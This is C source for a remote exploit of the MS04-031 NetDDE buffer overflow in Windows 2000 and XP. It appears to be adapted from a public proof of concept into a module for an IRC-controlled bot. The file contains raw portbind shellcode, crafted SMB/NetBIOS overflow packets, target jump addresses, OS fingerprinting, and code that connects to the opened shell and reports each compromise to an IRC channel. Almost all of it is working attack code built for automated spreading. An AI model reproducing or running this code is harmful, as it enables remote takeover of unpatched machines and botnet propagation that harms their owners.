/* HOD-ms04031-netdde-expl.c: 2004-12-30: PUBLIC v.0.2  
 * Copyright (c) 2004 houseofdabus.  
 * (MS04-031) NetDDE buffer overflow vulnerability PoC  
 *                 .::[ houseofdabus ]::.  
 * (special unstable version)  
 * ---------------------------------------------------------------------  
 * Description:  
 *    A remote code execution vulnerability exists in the  NetDDE  
 *    services because of an unchecked buffer. An attacker  who  
 *    successfully exploited this vulnerability could take complete  
 *    control of an affected system. However, the NetDDE services are  
 *    not started by default and would have to be manually started for  
 *    an attacker to attempt to remotely exploit this vulnerability.  
 *    This vulnerability could also be used to attempt to perform  
 *    a local elevation of privilege or remote denial of service.  
 * ---------------------------------------------------------------------  
 * Patch:  
 *  http://www.microsoft.com/technet/security/Bulletin/MS04-031.mspx  
 * ---------------------------------------------------------------------  
 * Tested on:  
 *    - Windows XP Professional SP0  
 *    - Windows XP Professional SP1  
 *    - Windows 2000 Professional SP2  
 *    - Windows 2000 Professional SP3  
 *    - Windows 2000 Professional SP4  
 *    - Windows 2000 Advanced Server SP4  
 * ---------------------------------------------------------------------  
 *    This is provided as proof-of-concept code only for educational  
 *    purposes and testing by authorized individuals with permission to  
 *    do so.  
 * ---------------------------------------------------------------------  
 * Targets:  
 *        0 [0x00abfafc]: WinXP [universal]  
 *        1 [0x009efb40]: Win2K [universal]  
 */  
#include "includes.h"
#include "functions.h"

#ifndef NO_NETDDE

struct targets {
	int num;
	long jmpaddr;
}
netddetargets[]= {
	{ 0, 0x00abfb1c - 0x20 },//"WinXP [universal] "
	{ 1, 0x009efb60 - 0x20 } //"Win2K [universal] "
};

/* portbind shellcode */  
unsigned char portbindsc[] =   
"\xeb\x70\x56\x33\xc0\x64\x8b\x40\x30\x85\xc0\x78\x0c\x8b\x40\x0c"  
"\x8b\x70\x1c\xad\x8b\x40\x08\xeb\x09\x8b\x40\x34\x8d\x40\x7c\x8b"  
"\x40\x3c\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78"  
"\x03\xd5\x8b\x4a\x18\x8b\x5a\x20\x03\xdd\xe3\x34\x49\x8b\x34\x8b"  
"\x03\xf5\x33\xff\x33\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x03"  
"\xf8\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x03\xdd\x66\x8b"  
"\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\x89\x44\x24\x1c"  
"\x61\xc3\xeb\x3d\xad\x50\x52\xe8\xa8\xff\xff\xff\x89\x07\x83\xc4"  
"\x08\x83\xc7\x04\x3b\xf1\x75\xec\xc3\x8e\x4e\x0e\xec\x72\xfe\xb3"  
"\x16\x7e\xd8\xe2\x73\xad\xd9\x05\xce\xd9\x09\xf5\xad\xa4\x1a\x70"  
"\xc7\xa4\xad\x2e\xe9\xe5\x49\x86\x49\xcb\xed\xfc\x3b\xe7\x79\xc6"  
"\x79\x83\xec\x60\x8b\xec\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5e"  
"\xe8\x3d\xff\xff\xff\x8b\xd0\x83\xee\x36\x8d\x7d\x04\x8b\xce\x83"  
"\xc1\x10\xe8\x9d\xff\xff\xff\x83\xc1\x18\x33\xc0\x66\xb8\x33\x32"  
"\x50\x68\x77\x73\x32\x5f\x8b\xdc\x51\x52\x53\xff\x55\x04\x5a\x59"  
"\x8b\xd0\xe8\x7d\xff\xff\xff\xb8\x01\x63\x6d\x64\xc1\xf8\x08\x50"  
"\x89\x65\x34\x33\xc0\x66\xb8\x90\x01\x2b\xe0\x54\x83\xc0\x72\x50"  
"\xff\x55\x24\x33\xc0\x50\x50\x50\x50\x40\x50\x40\x50\xff\x55\x14"  
"\x8b\xf0\x33\xc0\x33\xdb\x50\x50\x50\xb8\x02\x01\x11\x5c\xfe\xcc"  
"\x50\x8b\xc4\xb3\x10\x53\x50\x56\xff\x55\x18\x53\x56\xff\x55\x1c"  
"\x53\x8b\xd4\x2b\xe3\x8b\xcc\x52\x51\x56\xff\x55\x20\x8b\xf0\x33"  
"\xc9\xb1\x54\x2b\xe1\x8b\xfc\x57\x33\xc0\xf3\xaa\x5f\xc6\x07\x44"  
"\xfe\x47\x2d\x57\x8b\xc6\x8d\x7f\x38\xab\xab\xab\x5f\x33\xc0\x8d"  
"\x77\x44\x56\x57\x50\x50\x50\x40\x50\x48\x50\x50\xff\x75\x34\x50"  
"\xff\x55\x08\xf7\xd0\x50\xff\x36\xff\x55\x10\xff\x77\x38\xff\x55"  
"\x28\xff\x55\x0c";
#define SET_PORTBIND_PORT(buf, port)	*(unsigned short *)(((buf)+300)) = (port)  
/*   
   eax = target[].jmpaddr -> stack -> jmpcode -> shellcode  
  
   1. 0100D605   call        dword ptr [eax+20h]  
   2. jmpcode  
   3. shellcode  
*/  
char jmpcode[] = "\x90\x90\x90\x90\x66\x81\xC7\x20\x03\xFF\xE7\x90\x90\x90\x90\x90"
				"\x50\x6f\x43\x20\x66\x6f\x72\x20\x4e\x65\x74\x44\x44\x45\x20\x28"
				"\x4d\x53\x30\x34\x2d\x30\x33\x31\x29\x2e\x20\x43\x6f\x70\x79\x72"
				"\x69\x67\x68\x74\x20\x28\x63\x29\x20\x32\x30\x30\x34\x2d\x32\x30"
				"\x30\x35\x20\x68\x6f\x75\x73\x65\x6f\x66\x64\x61\x62\x75\x73\x2e"
				"\xBB\xBB\xBB\xBB" /* => eax */
				"PADPAD";

char smb_sesreq[] = "\x81\x00\x00\x44\x20\x43\x4b\x46\x44\x45\x4e\x45\x43\x46\x44\x45"
					"\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43\x41\x43\x41\x43\x41\x43"
					"\x41\x43\x41\x43\x41\x00\x20\x45\x4b\x45\x44\x46\x45\x45\x49\x45"
					"\x44\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
					"\x41\x43\x41\x43\x41\x41\x41\x00";

char smb_negotiate[] = "\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00"
					"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02"
					"\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e"
					"\x31\x32\x00";

char d1[] = "\x0d\x12\x0b\x06\x0d\x18\x1c\x01\x10\x03\x12\x08\x1d\x1f\x0a\x0a"
			"\x16\x02\x17\x0e\x1b\x0d";
char netddereq1[] = "\x81\x00\x00\x44";
char netddereq2[] = "CACACACACACACACACACACACACACACABP";
char h1[] = "\x45\x44\x44\x4E\x00\x00\x00";
char h2[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char h3[] = "\x00\x00\x02\x02\x00\x00\x00\x01\x00\x00\x00";

unsigned long ndlen = 0;  
unsigned long ntarget = 0;  

unsigned long fixx(unsigned char *data, unsigned long i)
{
	unsigned long len;
	len = (data[i+3]<<24) + (data[i+2]<<16) + (data[i+1]<<8) + (data[i]);
	return len;
}
 
unsigned long chksum(unsigned char *data, unsigned long dlen)
{
	unsigned long i, len;
	unsigned long chk;

	chk = 0xFFFFFFFF;
	len = dlen - 4;

	for (i=0; i<len; i+=4)
		chk += fixx(data, i);

	while (i < dlen)
	{
		chk += (unsigned char)data[i];
		i++;
	}
	return chk;
}

char * netbios_encode(char *ndata, char service)
{
	char *tmpdata, *data, *nret;
	unsigned long dlen;
	char odiv, omod, o;
	int i;

	data = (char *)calloc(17, 1);
	memcpy(data, ndata, strlen(ndata));

	dlen = strlen(data);
	while (dlen < 15) {
		strcat(data, "\x20");
		dlen++;
	}

	memcpy(data+strlen(data), &service, 1);

	nret = (char *)calloc(strlen(data)*2+1, 1);
	tmpdata = nret;

	for (i=0; i<16; i++) {
		o = (char)data[i];
		odiv = o / 16;
		odiv = odiv + 0x41;
		omod = o % 16;
		omod = omod + 0x41;
		*tmpdata++ = odiv;
		*tmpdata++ = omod;
	}

	free(data);
	return nret;
}

unsigned char * find_smbname(unsigned char *data, unsigned long len)
{
	unsigned char *ptr;
	unsigned long i = 0;

	ptr = data;
	ptr += 91;

	while (i <= len - 3) {
		if (ptr[i] == '\x00')
		if (ptr[i+1] == '\x00')
		if (ptr[i+2] == '\x00')
			return ptr+i+3;
		i++;
	}
	return NULL;
}

/* NetDDE packet */
char * packet_assembly(char *name, char *host)
{
	char *main, *header, *data;
	char *lname, *rhost;
	unsigned long llen, rlen, len, hlen, dlen, csum, i;
	unsigned char name_hi, name_low, rhost_hi, rhost_low;  
	unsigned char hod_hi, hod_low, len_hi, len_low;
	unsigned char nops[] = "\x90\x90\x90\x90"; /* nops */
	//unsigned short port;
	//unsigned char *sc;
	char hod[] = "HOD-HOD\x01";
	char hmain[] = "\x01\x00\xBE\x05\x0A\x00\x00";
	char tmp[8];

	llen = strlen(name) + 4;
	rlen = strlen(host);
	lname = (char *)calloc(llen + 3, 1);
	rhost = (char *)calloc(rlen + 3, 1);

	memcpy(lname, name, llen);
	strcpy(rhost, host);
	memcpy(lname + llen, "\x01", 1);
	strcat(rhost, "\x01");

	name_hi   = (unsigned char) ((llen+1) / 256);
	name_low  = (unsigned char) ((llen+1) % 256);
	rhost_hi  = (unsigned char) ((rlen + llen + 2) / 256);
	rhost_low = (unsigned char) ((rlen + llen + 2) % 256);

	len = sizeof(hod) - 1;
	hod_hi  = (unsigned char) (len / 256);
	hod_low = (unsigned char) (len % 256);

	main = (char *)calloc(sizeof(hod)-1 + sizeof(hmain)-1 + llen + rlen + 11, 1);  

	memcpy(main, hmain, sizeof(hmain)-1);
	sprintf(tmp, "%c%c%c%c%c%c", name_hi, name_low, rhost_hi, rhost_low, hod_hi, hod_low);  

	memcpy(main+sizeof(hmain)-1, tmp, 6);
	memcpy(main+sizeof(hmain)-1+6, "\x00", 1);
	memcpy(main+sizeof(hmain)-1+7, lname, llen+1);
	memcpy(main+sizeof(hmain)-1+7+llen+1, rhost, rlen+1);
	memcpy(main+sizeof(hmain)-1+7+llen+1+rlen+1, hod, sizeof(hod)-1);

	memcpy(main+sizeof(hmain)-1+7+llen+1+rlen+1+sizeof(hod)-1, "\x2e", 1);

	len = sizeof(hmain)-1+7+llen+1+rlen+1+sizeof(hod)-1+1;
	len_hi  = (unsigned char) (len / 256);
	len_low = (unsigned char) (len % 256);

	/* header */  
	header = (char *)calloc(sizeof(h1)-1 + sizeof(h2)-1 + sizeof(h3)-1 + 9, 1);

	memcpy(header, h1, sizeof(h1)-1);
	sprintf(tmp, "%c%c", len_hi, len_low);
	memcpy(header+sizeof(h1)-1, tmp, 2);
	memcpy(header+sizeof(h1)-1+2, h2, sizeof(h2)-1);
	memcpy(header+sizeof(h1)-1+2+sizeof(h2)-1, tmp, 2);
	memcpy(header+sizeof(h1)-1+2+sizeof(h2)-1+2, h3, sizeof(h3)-1);

	csum = chksum((unsigned char*)main, len);
	memcpy(header+sizeof(h1)-1+sizeof(h2)-1+4 + sizeof(h3)-1, &csum, 4);

	/* data */
	hlen = sizeof(h1)-1 + sizeof(h2)-1 + sizeof(h3)-1 + 8;
	data = (char *)calloc(sizeof(d1)-1 + len+hlen + 37 + 1200, 1);

	csum = chksum((unsigned char*)header, hlen);
	memcpy(data+4, &csum, 4);
	memcpy(data+4+4, header, hlen);
	memcpy(data+4+4+hlen, main, len);
	memcpy(data+4+4+hlen+len, d1, sizeof(d1)-1);

	/* nops */
	for (i=0; i<154; i++)
		memcpy(data+4+4+hlen+len+sizeof(d1)-1 + i*4, nops, 4);

	/* shellcode */
	//if (!backip) {
		/* portbind */
		SET_PORTBIND_PORT(portbindsc,fhtons(bindport));
		memcpy(data+4+4+hlen+len+sizeof(d1)-1+154*4, portbindsc, sizeof(portbindsc)-1);  
		dlen = 4+hlen+len+sizeof(d1)-1+sizeof(portbindsc)-1+154*4;  
		/*port=fhtons(bindport)^(USHORT)0x9999;
		memcpy(&bindshell[176], &port, 2);
		sc = (unsigned char *)bindshell;
        memcpy(data+4+4+hlen+len+sizeof(d1)-1+154*4,sc,strlen((const char*)sc)-1);
		dlen = 4+hlen+len+sizeof(d1)-1+strlen((const char*)sc)-1+154*4;  */
		//memcpy(data+4+4+hlen+len+sizeof(d1)-1+154*4,portbindsc, sizeof(portbindsc)-1);  
		//dlen = 4+hlen+len+sizeof(d1)-1+sizeof(portbindsc)-1+154*4;  
	/*} else {  
		// connectback
		SET_CONNECTBACK_IP(connectbacksc, backip);  
		SET_CONNECTBACK_PORT(connectbacksc, htons(bindport));  
		memcpy(data+4+4+hlen+len+sizeof(d1)-1+154*4,  connectbacksc, sizeof(connectbacksc)-1);  
		dlen =  4+hlen+len+sizeof(d1)-1+sizeof(connectbacksc)-1+154*4;  
	}*/

	ndlen = dlen + 4;
	dlen = fhtonl(dlen);
	memcpy(data, &dlen, 4);

	free(lname);
	free(rhost);
	free(main);
	free(header);
	return data;
}
  
/* fingerprinting */
unsigned char * smb_get_name(char *ip)
{
	int sock, r;  
	unsigned long smbname_len;  
	unsigned char *name = NULL, *smbname;  
	struct sockaddr_in s;  
	struct hostent *he;  
	unsigned char buf[256];  
  
  
	if ((he = fgethostbyname(ip)) == NULL) {  
		//printf("[-] Unable to resolve %s\n", ip);  
		return NULL;  
	}  
  
	sock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);  
	if (sock < 0) return NULL;  
  
	s.sin_family = AF_INET;  
	s.sin_addr = *((struct in_addr *)he->h_addr);  
	s.sin_port = fhtons(139);  
	memset(&(s.sin_zero), '\0', 8);  
  
	ZeroMemory(buf,256);  
  
	//printf("[*] Connecting to %s:139 ... ", ip);  
	r = fconnect(sock, (struct sockaddr *) &s, sizeof(struct sockaddr_in));  
	if (r == 0) {  
		//printf("OK\n[*] Fingerprinting... ");  
		/* sending session request */  
		fsend(sock, smb_sesreq, sizeof(smb_sesreq)-1, 0);  
		Sleep(1000);  
		r = frecv(sock, (char *)buf, 256, 0);  
		if (r < 0) goto err;  
  
		ZeroMemory(buf,256);  
		/* sending negotiation request */  
		fsend(sock, smb_negotiate, sizeof(smb_negotiate)-1, 0);  
		Sleep(1000);  
		r = frecv(sock, (char *)buf, 256, 0);  
		if (r < 0) goto err;  
  
		//printf("OK\n");  
		smbname = find_smbname(buf, r);  
		if (smbname == NULL) goto err;  
		smbname_len = smbname - buf;  
  
		name = (unsigned char *)calloc(smbname_len, 1);  
  
		/* decoding */  
		r = 0;  
		while (smbname_len) {  
			if (*smbname != '\x00') {  
				name[r] = *smbname;  
				r++;  
			}  
			smbname++;  
			smbname_len--;  
		}  
	} else {  
		//printf("failed\n[-] Can't connect to %s:139\n", ip);  
	}  
  
err:  
	fshutdown(sock, 1);  
	fclosesocket(sock);  
  
	return name;  
}

BOOL netdde(char *target, void* conn,EXINFO exinfo)
{
	IRC* irc=(IRC*)conn;
	int len, sockfd;  
//	char *host;  
	char *req;  
//	struct hostent *he;  
	struct sockaddr_in their_addr;  
	char rbuf[4096];  

	char *ses_req;  
	char *data, *hname;  
	char *hn, *hn2;  
	unsigned long req_sz, hname_len, hn_len;  

	int iHostOS=FpHost(exinfo.ip, FP_RPC);
	if(iHostOS==OS_UNKNOWN)
		iHostOS=FpHost(exinfo.ip, FP_SMB);
	if(iHostOS==OS_WINNT)
		return FALSE;
	
	if (iHostOS==OS_WIN2K)
		ntarget=1;
	else
		ntarget=0;//XP

	hn = (char *)smb_get_name(exinfo.ip);  
	if (!hn)
	{
		if (!exinfo.silent && exinfo.verbose)
			irc->privmsg(target,"%s %s: Failed to get netbios name: %s. (%s)", scan_title, exploit[exinfo.exploit].name, exinfo.ip, hn);
		return FALSE;
	}
	if (!exinfo.silent && exinfo.verbose)
		irc->privmsg(target,"%s %s: Found netbios name: %s. (%s) (%s)", scan_title, exploit[exinfo.exploit].name, exinfo.ip, hn, (ntarget==0?"XP":"2K"));

	// target jmpaddr
	memcpy(jmpcode+80, &netddetargets[ntarget].jmpaddr, 4);

	ses_req = (char *)calloc(sizeof(netddereq1)-1 + sizeof(netddereq2)-1 + 114, 1);

	memcpy(ses_req, netddereq1, sizeof(netddereq1)-1);
	memcpy(ses_req+sizeof(netddereq1)-1, "\x20", 1);

	hname = netbios_encode(hn, 0x1F);
	hname_len = strlen(hname);

	memcpy(ses_req+sizeof(netddereq1)-1+1, hname, hname_len);
	memcpy(ses_req+sizeof(netddereq1)-1+1+hname_len, "\x00\x20", 2);
	memcpy(ses_req+sizeof(netddereq1)-1+1+hname_len+2, netddereq2, sizeof(netddereq2)-1);
	memcpy(ses_req+sizeof(netddereq1)-1+1+hname_len+2+sizeof(netddereq2)-1, "\x00", 1);

	req_sz = sizeof(netddereq1)-1+sizeof(netddereq2)-1+hname_len+4;

	if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) < 0)
		return FALSE;

	req = netddereq1;

	their_addr.sin_family = AF_INET;
	their_addr.sin_port = fhtons(exinfo.port);
	their_addr.sin_addr.s_addr = finet_addr(exinfo.ip);
	memset(&(their_addr.sin_zero), '\0', 8);

	if (fconnect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) < 0)
	{
		if (!exinfo.silent && exinfo.verbose)
			irc->privmsg(target,"%s %s: Failed to connect: %s. (%s)", scan_title, exploit[exinfo.exploit].name, exinfo.ip, hn);
		return FALSE;
	}

	if (!exinfo.silent && exinfo.verbose)
		irc->privmsg(target,"%s %s: Connected to: %s:%d.", scan_title, exploit[exinfo.exploit].name, exinfo.ip, exinfo.port);

	if (fsend(sockfd, ses_req, req_sz, 0) < 0)
	{
		fclosesocket(sockfd);
		return FALSE;
	}

	len = frecv(sockfd, rbuf, 4096, 0);  
	if (len < 0)
	{
		fclosesocket(sockfd);
		return FALSE;
	}

	// check NetDDE
	if ((unsigned char)rbuf[0] != 0x82)
	{
		if (!exinfo.silent && exinfo.verbose)
			irc->privmsg(target,"%s %s: NetDDE disabled or wrong netbios name: %s. (%s)", scan_title, exploit[exinfo.exploit].name, exinfo.ip, hn);
		fclosesocket(sockfd);
		return FALSE;
	}

	hn2 = (char *)calloc(16, 1);
	memcpy(hn2, hn, strlen(hn));
	hn_len = strlen(hn);

	while (hn_len < 15) {
		strcat(hn2, "\x20");
		hn_len++;
	}

	data = packet_assembly(jmpcode, hn2);
	if (fsend(sockfd, data, ndlen, 0) < 0)
	{
		if (!exinfo.silent && exinfo.verbose)
			irc->privmsg(target,"%s %s: Attack failed: %s:%d", scan_title, exploit[exinfo.exploit].name, exinfo.ip, exinfo.port);
		fclosesocket(sockfd);
		return FALSE;
	}

	if (!exinfo.silent && exinfo.verbose)
		irc->privmsg(target,"%s %s: Attacked: %s:%d.", scan_title, exploit[exinfo.exploit].name, exinfo.ip, exinfo.port);

	len = frecv(sockfd, rbuf, 4096, 0);  

	if (!exinfo.silent && exinfo.verbose)
		irc->privmsg(target,"%s %s: final frecv: %s. (%s)", scan_title, exploit[exinfo.exploit].name, exinfo.ip, hn);

	fshutdown(sockfd, 1);  
	fclosesocket(sockfd);

	if(data) free(data);  
	if(hn2) free(hn2);  
	if(ses_req) free(ses_req);  
	if(hname) free(hname);

	if (ConnectShell(exinfo,bindport))
	{
		exploit[exinfo.exploit].stats++;
		if (!exinfo.silent)
			irc->privmsg(target,"%s %s: Exploiting IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
		return TRUE;
	}
	else
		if (!exinfo.silent && exinfo.verbose)
			irc->privmsg(target,"%s %s: Failed to exploit IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);

	return FALSE;
}
/*
int  
main (int argc, char **argv)  
{  

#ifdef _WIN32  
	WSADATA wsa;  
#endif  
  
  
#ifdef _WIN32  
	WSAStartup(MAKEWORD(2,0), &wsa);  
#endif  
  
  
	printf("\n      (MS04-031) NetDDE buffer overflow vulnerability PoC\n\n");  
	printf("\tCopyright (c) 2004-2005 .::[ houseofdabus ]::.\n\n\n");  
  
	vargs(argc, argv);  
  
	hn = argv[2];	// target netbios name
	host = argv[1]; // target host name
  
	if (strlen(host) > 1024) return 0;  
  
return 0;  
} 
void  
usage(char *prog)  
{  
	int i;  
  
	printf("%s <host> <netbios name> <target> <bindport> [connectback IP] [options]\n\n", prog);  
	printf("Targets:\n");  
	for (i = 0; i < 2; i++)  
		printf("	%d [0x%.8x]: %s\n", target[i].num,  
target[i].jmpaddr, target[i].name);  
	printf("\nOptions:\n\t-f: Netbios name fingerprinting\n");  
	exit(0);  
  
}  
  
void  
vargs(int argc, char **argv)  
{  
	int i, finger = 0;  
	char *nname = NULL;  
  
	for (i = 2; i < argc; i++) {  
		if (argv[i][0] == '-') {  
			if (argv[i][1] == 'f')  
				finger = 1;  
		}  
	}  
  
	if (finger && argc > 2) {  
		nname = smb_get_name(argv[1]);  
		if (nname) {  
			printf("[+] Remote netbios name: %s\n",  
nname);  
			free(nname);  
		}  
		exit(0);  
	} else  
	if (argc < 5) usage(argv[0]);  
	if ((ntarget = atoi(argv[3])) > 1) usage(argv[0]);  
  
	bindport = (unsigned short)atoi(argv[4]);  
	if (argc > 5) backip = inet_addr(argv[5]);  
  
return;  
}  
  
  
  
*/
#endif